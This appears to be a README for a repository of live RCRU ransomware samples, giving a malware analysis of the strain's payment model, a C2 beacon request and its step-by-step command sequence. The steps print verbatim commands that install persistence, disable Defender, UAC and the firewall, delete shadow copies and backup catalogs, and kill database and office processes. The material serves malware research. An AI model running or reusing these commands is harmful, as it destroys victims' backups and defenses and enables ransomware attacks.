# RCRU-Ransomware-Samples
Samples from the RCRU Ransomware - may 2023

After a couple of days worth of research and simple decompiling:

##**Non-Technical details:**

RCRU is a Ransomware as a Service (RaaS) platform. The behaviour of the RCRU Ransomware looks a lot like the Goodmorning Ransomware strain.
The RCRU Ransomware operator behaves like any other ransomware operator. It will extort you for money, and most likely it will go down in price after a while. 
The reason for this is that the Ransomware operator who has bought the RCRU license for a year for a price of 2.000$ must pay a fixed amount to the creator of the program per ransomware. 
The price is: 650$ for the developer/creator of the RCRU ransomware. Everything above 650$ will go to the operator. This money needs to be transfered to a Tether wallet (TRC20).

##**Technical details:**

The RCRU ransomware encrypts the files with a private key. 
For now our research points to a simple Request to a C2 server.
The Request looks like this:

```http://xxx.xxx.xxx.xxx:3586/36_And_Netword_Drive_Size:0_Encryption_Mode:_Fast_Mode!Empty]_____10/5/2017,_10:19:56_AM$_Tue_05/16/2023-16:35:[Version_6.1.7601|Microsoft_Windows_7_Professional_hg3l,<?xmlversion="1.0"encoding="iso-8859-1"?><!DOCTYPEhtmlPUBLIC"-//W3C//DTDXHTML1.0Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><htmlxmlns="http://www.w3.org/1999/xhtml"xml:lang="en"lang="en"><head><title>404NotFound</title></head><body><h1>404NotFound</h1></body></html>~L8avOVpc7FxdSr2OF6gGPYcmRnJ+srhkHET0nkMjIw06DslAkMlJ4bnRSbDAH5sKzv5e1YmsLX/RwZnh5JDRLlFqwJIchWh9kZTX+c5MVTFQFV73uHepQQpcJM2mEYySYQRkiC11JHcGhSQSBJY5RBK7lgzAvhMRXKcKLhSaA5kQc+yQZQVdMpULiO4toI8wilrOkE9NjVlDgxagmIsnUWCgWTQNl42VEvhKnrWH5EDsoQLAxD8FerrGQ+3iSf85qk/a/9rWLkFXuxdzjKr0iR/mHYkIvMLxFYhFCV2RfjGfJlzb2JNEBZAWnCWTChtatP5+UD98CmeGcRNbxFSWoyJlkaROSGp+M7iJVGLOoU/wAzU3SRkTdWjR82o24L50dfYjMUMcb2v/8bHi0U/C2eCcBeVLX2zEPgu6QZo11C6JtvtnsOqWR+mz9ErI90h3pJCijIS5397dGpleQ3DnHCXi/0V+3rTfiqq2O/PBtckCULk11loFHK/T15K5c++D9iiJ7x23Rxwu8WQDR14KyjAP9lDs/4k/gk2kiNtC3sRMMopyt4x5hbJSuJL6v50NopPdB3LV8T3P3V38GxWGZYUM0EQRmuRh0wc5zAgERAoIBADBhntF80/3gliydOSfG03CnYl73ffuO5lX96+JapFeYhUQBxPPVozLxOgMZljirfjNFr9NZTei4lQ0TwLpLaq0ahN02hGuP2daDZYLnPQ5EfpuHrIBlW/t/RVGwsklKEjIThGCaUFDEp2FN/gEj567SjpFFgk4E2gVS1eUACaXDotb2hsKKq7ElrJB879Ofrvml/QaOEXLm5jSutcBA1pkaKyeWs+0ve0he6arwjMgq5qUNbnOxXDlkrk/fZ9Jo3I0p392CpM0nIWNkmjBl7ff4uy6I4LPsTciGwJwVJcmzVNvVP/s9DTpoZn3pJv30XbSUHHKp/n78dC1OHV1ITvUCgYEAx8Xy1NEgJvc3LPsh+OE/xk0zwmSIh1LurTJpLGbpg0ZpW8ku/nG6xUa+pi06ZXt7M6C7dC+O/OlgcaH/UHIO5wOcQ+6ToAI6kEHagMWl/oGZT/si1vTINoIEAbeKBHtFS+WXnsHJGhgn8R13A0HNzP3ri0tBZN3lFbD5QkRw6qUCgYEAv6Gj96Gwe6Q/wFxFMyXqheCRXaCENAfx7JwrD9QmStfzU81wWdMGxBR0phD55+yo0L2UJrNZrcGWFLMVNJFjEwKiitF72vWa5rOLCcsmuaIoVXKKETGLpEuy9964eH2d4N0CU0E2bnUsQcJk4Opn1jfKOI6eEYfZzW+IkrLlwTcCgYBGghl4Sc8cz7ke7zkqqdpF/SFTqwMClb2mikM82QcfRgcRVhCWCgWvCejvW0HJduAwVti/mFCVf4tzZlocZH268jcnCOjPD9hvJk0eY+A7tUUrSZPTZXPXALYeuT/FWK8LunG/j7BjkA4Y3TkQNVexwwfWz0RBt7pD5Bu9CRjLSQKBgGVzsSi/AxRH5YP0nRsUEr9YxW3Ncyqay18lgDWObqAX+Up70hFvuEmwef2QhE2baG6Ce5wEmOOEmr+qGkkBrOvyVg1BugqCBrZfDV+Jqxb7fsPTOgkaOt6Cbc6E+D/KCEneaqSL76PjrgSyNWgDoGJZxWk8cc0Lr4rgsbcTapN3AoGAXCl7j7OboogEvQi0aHTRkMX/aMbzuQZphzX4o6F8hPXm58o775CuPdlATtUDUPPy2JxgKzzfhBdDhA5B83TVC9vFr8KL18JfWdcndqNlInaVr6Sm7Ge/vTl2yb7btO0dwhp9mO/k1mmNvtUtJShVxxYtJzBNPrefYbz24tpmKoY=&GMGNZ*2.999504(4)4,d5xx.ransomware-email.com```

##**In this repo you will find:**

- Ransomware note (Readme.hta & Restore_Your_Files.txt)
- Xinfecter.exe
- Manual Encrypters like: 
  - XXX_Fast.exe
  - XXX_Manual.exe
  - XXX_Office.exe
  - R_cfg.ini
- decrypter.exe for a specific ID

##**Ransomware behaviour in steps:**

1. C:\Windows\system32\cmd.exe /c tasklist /v /fo csv | findstr /i "dcdcf"
  1.1 tasklist /v /fo csv
  1.2 findstr /i "dcdcf"
2. Upon execution it will execute the following to load up the Xinfector.exe and add it to the startup on different locations: C:\Windows\system32\cmd.exe /c sc create SqlBakup binPath= "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Xinfecter.exe" start=auto
  2.1 sc create SqlBakup binPath= "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Xinfecter.exe" start=auto (step 2. and 2.1 repeats itself around 3 times)
3. C:\Windows\system32\cmd.exe /c ver
4. C:\Windows\system32\cmd.exe /c cd "%SystemDrive%\Users\%username%\AppData\"&S-2153.bat
  4.1 "C:\Windows\System32\WScript.exe" "C:\Users\admin\AppData\S-8459.vbs"
  4.2 C:\Windows\system32\cmd.exe /c ""C:\Users\admin\AppData\S-6748.bat" "
  4.3 tasklist /v
    4.3.1 find  /I /c "dcdcf" 
    4.3.2 vssadmin.exe  Delete Shadows /All /Quiet
    4.3.3 timeout  /t 15 /nobreak 
    4.3.4 tasklist  /fi "ImageName eq XXX_Manual.exe" /fo csv  
    4.3.5 find  /I "XXX_Manual.exe"
    4.3.x steps repeat around 2 times
  5. After a few system checks for time and date it will proceed to step 6 where it alters/deletes the state of the AV and shadow copies. 
  6. C:\Windows\system32\cmd.exe /c reg.exe add "HKLMSoftwarePoliciesMicrosoftWindows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f&reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f&vssadmin.exe Delete Shadows /All /Quiet&wmic shadowcopy delete&netsh advfirewall set currentprofile state off&netsh firewall set opmode mode=disable&netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes&wbadmin delete catalog -quiet
  7. C:\Windows\system32\cmd.exe /c taskkill /im msftesql.exe&taskkill /im sqlagent.exe&taskkill /im sqlbrowser.exe&taskkill /im sqlservr.exe&taskkill /im sqlwriter.exe&taskkill /im oracle.exe&taskkill /im ocssd.exe&taskkill /im dbsnmp.exe&taskkill /im synctime.exe&taskkill /im agntsvc.exe&taskkill /im mydesktopqos.exe&taskkill /im isqlplussvc.exe&taskkill /im xfssvccon.exe&taskkill /im mydesktopservice.exe&taskkill /im ocautoupds.exe&taskkill /im agntsvc.exe&taskkill /im encsvc.exe&taskkill /im firefoxconfig.exe&taskkill /im tbirdconfig.exe&taskkill /im ocomm.exe&taskkill /im mysqld.exe&taskkill /im mysqld-nt.exe&taskkill /im mysqld-opt.exe&taskkill /im dbeng50.exe&taskkill /im sqbcoreservice.exe&taskkill /im excel.exe&taskkill /im infopath.exe&taskkill /im msaccess.exe&taskkill /im mspub.exe&taskkill /im onenote.exe&taskkill /im outlook.exe&taskkill /im powerpnt.exe&taskkill /im steam.exe&taskkill /im thebat.exe&taskkill /im thebat64.exe&taskkill /im thunderbird.exe&taskkill /im visio.exe&taskkill /im winword.exe&taskkill /im wordpad.exe


# !!  Do not run this without a sandbox environment. These are live samples and will kill your environment. I am not responsible for any damage. !!

 

